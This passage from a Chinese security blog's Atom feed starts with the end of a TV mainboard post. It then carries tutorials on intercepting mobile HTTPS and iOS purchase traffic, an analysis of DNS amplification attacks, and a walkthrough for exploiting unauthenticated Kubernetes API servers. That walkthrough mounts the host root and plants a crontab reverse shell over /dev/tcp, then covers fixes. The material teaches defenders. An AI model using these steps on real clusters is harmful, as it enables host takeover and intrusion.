+<p>我们可以彻底告别基于 Android TV 的电视盒子，因为盒子有的功能，电视全部都可以实现，而且 Sony 电视对杜比音效、杜比全景声、杜比视界等声音特效的支持也远强于普通的电视盒子，至于其他的功能，这里就不再做赘述，大家可以自己去慢慢发觉，就不在此展开了。</p>
+<h2 id="瑕疵建议">瑕疵&amp;建议</h2>
+<p>文章的最后其实还有两个谈不上问题的小瑕疵，希望之后能够解决，第一个就是，Google TV 的 UI 界面的流畅感远远比不上 Apple TV 4k，后者在遥控器反应、系统流畅度、UI 动画上依旧是最高水平，Android 生态还有非常大的追赶空间。如果你觉得界面有卡顿感，我建议你和我一样在开发者模式中，把所有的动画时间都设置为 x2 能够极大的改善体验。</p>
+<p>另外一个瑕疵就是国行 Sony 的遥控器实在是太太太难用了。很难想象这是 Sony 设计出来的产品，没有背光，按键过于小，导致无法盲操，键位的设计也极度的不合理。这点罗永浩也在微博上吐槽过了，好在 Sony 自己也发现了问题，在新的 K 系列产品中给出了新款遥控器，可以说是全方位的升级了遥控体验，建议大家有条件可以等一等买海外的版本。</p>
+<figure data-type="image" tabindex="16"><img src="https://s2.loli.net/2022/05/31/Or1nPyR2LEIiGfb.png" alt="" loading="lazy"></figure>
+<p>那么更换主板这件事适合那些人群呢？首先需要具有爱折腾的心且能从中获得快乐的人，其次就是不想外接一个电视盒子，即使电视盒子基本上能解决80%的问题，然后还得有一些完美主义癖好，想要不断去完善自己的生活质量，最后就是具备一定的动手能力和耐心，如果上述条件你都满足，那么立刻动手吧，整个的成本在不依赖外人帮助的情况下和购买一个电视盒子的花费相差无几。</p>
+<h2 id="尾巴">尾巴</h2>
+<p>因为疫情和等待配件的原因，从获得主板到真正完成更换再到完成所有的设置，踩过了大大小小不少坑。比如最开始我这款电视在 <strong>tvpartstoday</strong> 并没有货，等了很久才有我这个型号的主板，再到朋友从国外帮我人肉带回来主板，到它完成了整个的隔离周期后，才把主板交到我手上，在疫情肆虐的今天，过去成熟的海淘也变得困难重重。但是在付出了大量的时间和精力之后，收获的回报也更让人感到满足，或许这就是折腾的快乐吧。</p>
+<p>最后感谢整个过程中所有帮助到我的人：</p>
+<ul>
+<li>我的好朋友<a href="https://timonpeng.com/">Timon Peng</a></li>
+<li><a href="https://www.v2ex.com/member/VersusClyne">V2EX上的朋友</a></li>
+<li>Sony 工程师的尽职尽责的解答</li>
+</ul>
+<p>感谢🙏</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[移动端安全修炼（三）]]></title>
+        <id>https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-san/</id>
+        <link href="https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-san/">
+        </link>
+        <updated>2019-06-03T14:57:43.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="起因">起因</h2>
+<p>Android 7.0 之后 Google 默认不信任 User 域下的证书，也就是自行导入证书的方式去抓 HTTPS 包的方法已经不管用了，再加上现在大部分 App 都使用了 SSL Pinning，因此抓包的难度也比之前大了不少。此时再想抓 HTTPS 的流量就要用别的方法了。</p>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="起因">起因</h2>
+<p>Android 7.0 之后 Google 默认不信任 User 域下的证书，也就是自行导入证书的方式去抓 HTTPS 包的方法已经不管用了，再加上现在大部分 App 都使用了 SSL Pinning，因此抓包的难度也比之前大了不少。此时再想抓 HTTPS 的流量就要用别的方法了。</p>
+<!-- more -->
+<p>如果你够强直接逆向了 App，然后在应用的证书信任的配置文件里添加上你的证书，那么你还是可以抓取这个 App 的流量的，但是这种方法工作量太大，针对不同的应用你还需要一个个逆向文件，成本实在太高。这里讲的方法还是相对省事省时间的方法。<strong>通过获取手机 Root 权限，将 BurpSuite 的证书导入系统域中</strong>，这样系统就会信任你的证书，达到抓取所有 App 流量的目的了。</p>
+<h2 id="方法">方法</h2>
+<p>在进行之前确保你有以下的条件：</p>
+<ol>
+<li>一部获取了 Root 权限的手机</li>
+<li>电脑有 OpenSSL 环境</li>
+</ol>
+<p>如果你有了上面的条件，下面开始开始操作</p>
+<ol>
+<li>
+<p>从 Brupsuit 中导出证书文件 cacert.der</p>
+</li>
+<li>
+<p>将 Der 的证书转换为 PEM 格式 <code>openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM</code></p>
+</li>
+<li>
+<p>获取证书的 hash <code>openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1</code> 记住输出的hash，例如 '9a5ba575'</p>
+</li>
+<li>
+<p>将证书内容输出到新文件中，文件名称格式为为刚刚输出的 <strong>hash + .0</strong>， <code>cat cacert.pem &gt; 9a5ba575.0</code></p>
+</li>
+<li>
+<p>将证书内容格式化后追加到刚刚生成的文件中，<code>openssl x509 -inform PEM -text -in cacert.pem -out /dev/null &gt;&gt; 9a5ba575.0</code></p>
+</li>
+<li>
+<p>将文件传入手机中<code>adb push 9a5ba575.0 /system/etc/security/cacerts/</code></p>
+</li>
+<li>
+<p>使用 ADB 连接手机，执行 <code>adb shell</code> 切换到 Root 权限，然后挂载/system, <code>mount -o rw,remount /system</code>，给你的证书文件加上权限 <code>chmod 644 /system/etc/security/cacerts/9a5ba575.0</code></p>
+</li>
+<li>
+<p>重启手机，查看证书是否安装完成</p>
+</li>
+</ol>
+<p>重启手机之后，可以去你的证书目录中查看下证书是否正常导入了，下面是正常的的状态。</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2019/06/04/5cf545e54a48687440.jpg" alt="photo_2019-06-04_00-07-36.jpg" loading="lazy"></figure>
+<h2 id="尾声">尾声</h2>
+<p>除了导入证书，也有其他的方法来解决这个问题，比如通过 Xposed 插件的方法来实现抓包<br>
+<a href="https://bbs.pediy.com/thread-226435.htm">如何使用Xposed+JustTrustMe来突破SSL Pinning</a><br>
+或者通过虚拟环境的的方式来抓包，比如使用 HttpCanary，好处是不需要 Root 你的手机<br>
+<a href="https://juejin.im/post/5c1e370ae51d45374272696e">手机抓包+注入黑科技HttpCanary——最强大的Android抓包注入工具</a><br>
+你可以根据自己的实际情况来选择方案。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Kubernetes Api Server 未授权访问漏洞]]></title>
+        <id>https://brick713.github.io/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/</id>
+        <link href="https://brick713.github.io/kubernetes-api-server-wei-shou-quan-fang-wen-lou-dong/">
+        </link>
+        <updated>2018-12-05T15:26:12.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="0x00-漏洞原因">0x00 漏洞原因</h1>
+<p>Kubernetes 的服务在正常启动后会开启两个端口：</p>
+<ol>
+<li>Localhost Port （默认8080）</li>
+<li>Secure Port （默认6443）</li>
+</ol>
+<p>这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="0x00-漏洞原因">0x00 漏洞原因</h1>
+<p>Kubernetes 的服务在正常启动后会开启两个端口：</p>
+<ol>
+<li>Localhost Port （默认8080）</li>
+<li>Secure Port （默认6443）</li>
+</ol>
+<p>这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/12/05/5c07dec609ff5.png" alt="Web 页面" loading="lazy"></figure>
+<p>正常情况下 Api Server 是有权限控制的，分三种：</p>
+<ol>
+<li>Authentication</li>
+<li>Authorization</li>
+<li>AdmissionControl</li>
+</ol>
+<p>如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限，甚至通过创建自定义的容器去获取宿主机的权限。</p>
+<h1 id="0x01-漏洞利用">0x01 漏洞利用</h1>
+<p>利用方式按严重程度来说分两种，一种是直接通过利用 kubectl 客户端调用 Secure Port 接口去控制已经创建好的容器。另外一种利用方法就是通过创建一个自定义的容器将系统根目录的文件挂在到/mnt目录，通过修改/mnt/etc/crontab 来影响宿主机的 crontab，获取一个反弹 Shell 拿到宿主机的权限。先说第一种方式。</p>
+<p>首先，通过下面命令，去发现已经存在的容器</p>
+<pre><code>kubectl -s ip:port  get pods
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/12/05/5c07e27b68f05.png" alt="发现的容器" loading="lazy"></figure>
+<p>然后直接连接这个容器获取 Shell。</p>
+<pre><code>kubectl -s ip:port  --namespace=default exec -it dockername bash
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/12/06/5c07f8c667de8.png" alt="获取容器权限" loading="lazy"></figure>
+<p>这样就达到了控制容器的目的，但是容器的权限本身是不稳定的，如果宿主机本身的内核有问题的话，可以利用脏牛漏洞进行提权，获取宿主机的权限。具体可以参考：</p>
+<p><a href="https://github.com/scumjr/dirtycow-vdso">PoC for Dirty COW (CVE-2016-5195)</a><br>
+<a href="https://github.com/gebl/dirtycow-docker-vdso">DDirtycow-docker-vdso</a></p>
+<p>第二种方式就比较厉害了，利用成功后造成的危害也最大。</p>
+<p>首先我们根据官方的规范新建一个标准文件 <code>myapp.yaml</code> ,当然也可以使用 json 格式的。</p>
+<pre><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: myapp
+spec:
+  containers:
+  - image: nginx
+    name: container
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+</code></pre>
+<p>其中的 image 可以更换，最好使用基础镜像。</p>
+<p>然后我们可以通过两种方式提交我们创建容器的请求，一种是通过他的 Web 页面（也就是默认的8080端口）</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2018/12/05/5c07e697f2044.png" alt="Web 端方式提交" loading="lazy"></figure>
+<p>另外我们也可以通过他的另外的接口，通过 kubectl 客户端进行任务的提交。</p>
+<pre><code>kubectl -s  ip:port create -f yourfile
+</code></pre>
+<p>这里如果出现<code>Error from server (NotFound): the server could not find the requested resource</code>报错，可能是因为你的 kubectl 客户端和 kubernetes 的 server 端版本不相同导致的，一定要确保版本相同。</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2018/12/05/5c07edbf2b85e.png" alt="版本确认" loading="lazy"></figure>
+<p>提交成功后，我们用之前命令获取容器的 bash，然后向容器的 <code>/mnt/etc/crontab</code> 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。</p>
+<pre><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab
+</code></pre>
+<p>接下来就是见证奇迹的时刻，耐心的等待你就能拿到 Shell 了，验证之后可以确认是宿主机的权限，而不是容器的权限</p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2018/12/05/5c07e92f66a77.png" alt="获取宿主机权限" loading="lazy"></figure>
+<h1 id="0x01-漏洞修复">0x01 漏洞修复</h1>
+<p>在使用 kubernetes 的时候我们一定要进行身份的校验，K8S 的 APi 其实有非常严格的认证和授权</p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2018/12/05/5c07ea3d72caa.png" alt="校验认证流程" loading="lazy"></figure>
+<p>最简单的是在 Authentication 增加静态的 password，或者 token，可以的话关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生，可以参考 <a href="https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-password-file">官方文档</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[移动端安全修炼（二）]]></title>
+        <id>https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-er/</id>
+        <link href="https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-er/">
+        </link>
+        <updated>2017-10-15T15:12:11.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="前因">前因</h2>
+<p>iOS针对IAP有一个保护机制，如果使用了全局代理的方式，iOS检查到之后为了保障交易的安全性，将会拒绝IAP流程，所以是无法抓取交易数据的，以豆瓣阅读为例，未开启代理时，可以正常的进入IAP充值界面，开启代理后则会报错：</p>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="前因">前因</h2>
+<p>iOS针对IAP有一个保护机制，如果使用了全局代理的方式，iOS检查到之后为了保障交易的安全性，将会拒绝IAP流程，所以是无法抓取交易数据的，以豆瓣阅读为例，未开启代理时，可以正常的进入IAP充值界面，开启代理后则会报错：</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/06/27/5b33606b4fbff.jpeg" alt="使用全局代理充值请求报错" loading="lazy"></figure>
+<p>但是如果使用的动态代理的模式，可以绕过iOS的检查机制，下面就介绍下具体方法（PS：在这之前，默认你已经按之前的方法将证书倒入了iPhone设备中，教程地址：<a href="http://www.shaojike.com/2017/06/20/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%AE%89%E5%85%A81/">移动端安全修炼（一）</a>）。<br>
+这里需要补充一点，新版的iOS在信任证书环节需要新增一个信任，否则无法完全抓取HTTPS数据，具体位置在「设置」—「关于手机」—「信任证书设置」，如图所示：</p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/06/27/5b33606b44c5b.jpeg" alt="二次信任证书位置" loading="lazy"></figure>
+<h2 id="方法">方法</h2>
+<p>先准备一个PAC文件（PAC，一个自动代理配置脚本，包含了很多使用 JavaScript 编写的规则，它能够决定网络流量走默认通道还是代理服务器通道，控制的流量类型包括：HTTP、HTTPS 和 FTP）。内容很简单：</p>
+<pre><code>function FindProxyForURL(url, host)
+{
+    if(shExpMatch(url,&quot;*.douban.com/*&quot;)){
+return &quot;PROXY 192.168.1.134:8088&quot;;
+    }
+}
+</code></pre>
+<p>这个PAC的意思是域名<code>douban.com</code>使用<code>192.168.1.134:8088</code>进行代理，保存文件为test.pac之后，需要开启一个Web服务器提供这个PAC文件的地址，这里使用Python默认的模块来开一个简单的HTTP服务，到你保存的PAC路径使用如下命令：<code>sudo python -m SimpleHTTPServer 9527 </code>，这样在你自己本机的IP地址下，就启动了一个Web服务，之后将iOS的WI-FI网络配置你的代理PAC如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/06/27/5b33606adb9b5.jpeg" alt="代理配置" loading="lazy"></figure>
+<p>开启你的抓包软件，抓取你设定好的IP和端口的数据，打开豆瓣阅读进行正常的充值业务，发现不在报错而且可以抓取IAP支付流程的包了，这样就可做交易数据的安全分析了，设定和抓包详情如下：</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2018/06/27/5b336069a8e3e.png" alt="代理设置" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2018/06/27/5b33606b85e4f.png" alt="抓包详情" loading="lazy"></figure>
+<h2 id="尾巴">尾巴</h2>
+<p>使用该方法抓包，还是需要设备信任抓包工具的证书不管是Charles还是Burp Suite，基于HTTPS的流量抓包，证书是必备的，只不过使用动态代理的方式绕过了检查机制从而获取了想要的数据。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[浅析DNS反射放大攻击]]></title>
+        <id>https://brick713.github.io/qian-xi-dns-fan-she-fang-da-gong-ji/</id>
+        <link href="https://brick713.github.io/qian-xi-dns-fan-she-fang-da-gong-ji/">
+        </link>
+        <updated>2016-08-19T15:26:50.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="dns反射放大攻击分析">DNS反射放大攻击分析</h1>
+<p>前阵子业务上碰到了DDOS攻击，正好是DNS反射型的，之前只是听过，没自己处理过，仔细学习了一番之后做点记录。</p>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="dns反射放大攻击分析">DNS反射放大攻击分析</h1>
+<p>前阵子业务上碰到了DDOS攻击，正好是DNS反射型的，之前只是听过，没自己处理过，仔细学习了一番之后做点记录。</p>
+<!-- more -->
+<h2 id="简介">简介</h2>
+<p>DNS反射放大攻击主要是利用DNS回复包比请求包大的特点，放大流量，伪造请求包的源IP地址为受害者IP，将应答包的流量引入受害的服务器。</p>
+<p>简单对比下正常的DNS查询和攻击者的攻击方式：</p>
+<blockquote>
+<p>正常DNS查询：<br>
+源IP地址 -----DNS查询----&gt; DNS服务器 -----DNS回复包----&gt; 源IP地址</p>
+</blockquote>
+<blockquote>
+<p>DNS攻击：<br>
+伪造IP地址 -----DNS查询----&gt; DNS服务器 -----DNS回复包----&gt; 伪造的IP地址（攻击目标）</p>
+</blockquote>
+<h2 id="分析">分析</h2>
+<p>从服务器上抓了一些攻击包，根据这些数据包可以来看看这种攻击都是什么特点。</p>
+<ul>
+<li>全部是大量的DNS响应请求（Response请求）</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/06/27/5b33620123f20.jpg" alt="147159808627181.jpg" loading="lazy"></figure>
+<ul>
+<li>通常里面包含一些不存在或者生僻的域名，经过循环查询从而放大DNS流量</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/06/27/5b33620124647.jpg" alt="147159840859200.jpg" loading="lazy"></figure>
+<ul>
+<li>会将将 OPT RR 字段中的 UDP 报文大小设置为很大的值（如 4096）</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/06/27/5b336201000de.jpg" alt="147159870918672.jpg" loading="lazy"></figure>
+<p>通过这样放大了攻击流量。发送的 DNS 查询请求数据包大小一般为 60 字节左右，而查询返回结果的数据包大小通常为 3000 字节以上，因此，使用该方式进行放大攻击能够达到 50 倍以上的放大效果。</p>
+<ul>
+<li>大量的流量都来自正常的DNS服务器</li>
+</ul>
+<p>攻击者通过伪造IP向正常的DNS服务器发送这些恶意的查询请求，将流量引入受害者的服务器，受害者查不到攻击者的真实IP</p>
+<h2 id="解决方案">解决方案</h2>
+<ol>
+<li>如果没有必要可以关闭DNS服务（废话么不是</li>
+<li>如果有DNS服务，做好响应限制，DNS服务不应对互联网上的域名解析服务，而只响公司内部网络DNS解析请求</li>
+<li>限制DNS响应数据包大小的阈值，直接丢弃超大的响应数据包</li>
+</ol>
+<h2 id="尾巴">尾巴</h2>
+<p>希望以后不要碰上这种攻击，双休还得加班修复。以上全部！</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[移动端安全修炼（一）]]></title>
+        <id>https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-1/</id>
+        <link href="https://brick713.github.io/yi-dong-duan-an-quan-xiu-lian-1/">
+        </link>
+        <updated>2016-04-06T15:02:23.000Z</updated>
+        <summary type="html"><![CDATA[<p>新开一个坑，主要是记录自己学习移动端的一些相关知识。从基础到复杂吧，也不知道能写多少。从最开始的环境开始。</p>
+<p>移动端安全和Web差别并不大，也是分为服务端和客户端，只不过客户端换成了一个App，服务端和Web基本一致。因此挖掘服务端端漏洞和Web没有太大差别。重点在于如何挖掘客户端端漏洞，涉及反编译，代码审计，等等。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>新开一个坑，主要是记录自己学习移动端的一些相关知识。从基础到复杂吧，也不知道能写多少。从最开始的环境开始。</p>
+<p>移动端安全和Web差别并不大，也是分为服务端和客户端，只不过客户端换成了一个App，服务端和Web基本一致。因此挖掘服务端端漏洞和Web没有太大差别。重点在于如何挖掘客户端端漏洞，涉及反编译，代码审计，等等。</p>
+<!-- more -->
+<p>如果想要开始漏洞挖掘，最基本的还是要一个真实环境，一搬有两种方法，虚拟机和实体机，之前尝试过用虚拟机安装但是坑比较多，暂时放弃了，因为我手上有一台Android和iOS设备，因此暂时使用实体机器进行测试。开始主要针对服务端，那么就要涉及抓包，这里讲下怎么抓包。</p>
+<p>这里只讲一种方法，抓包的方式很多，后面也许会补充，我只讲自己用到的。</p>
+<p>需要工具：</p>
+<ol>
+<li>电脑一台</li>
+<li>burpsuite</li>
+</ol>
+<p>查看下自己电脑的IP，确保手机和电脑在同一个网络环境下。</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2018/06/27/5b3365f083db3.jpg" alt="IP" loading="lazy"></figure>
+<p>然后修改手机的Wi-Fi设置，将代理设置为该IP（以Android和ios为例）：</p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2018/06/27/5b33660ba2f2e.jpg" alt="手机" loading="lazy"></figure>
+<p>这样http的流量就会经过你的电脑，接下来需要配置burpsuite</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2018/06/27/5b33664558c7c.jpg" alt="burpsuite" loading="lazy"></figure>
+<p>这样就可以拦截http流量，但是大部分的流量是https的还需要倒入证书，使用手机的浏览器访问你的代理ip＋端口，可以看到burpsutie的界面，点击<strong>CA Certificate</strong>证书，可以把证书下载，然后倒入手机中即可</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2018/06/27/5b336663e7d73.jpg" alt="" loading="lazy"></figure>
+<p>这样可以看到流量http和https都经过你的电脑了，就可以像测试web一样进行抓包测试了。</p>
+<p>以上是最简单的抓包配置。从这基本上就可以开始进行简单的测试，新世界的大门就打开了。</p>
+]]></content>
+    </entry>
+</feed>
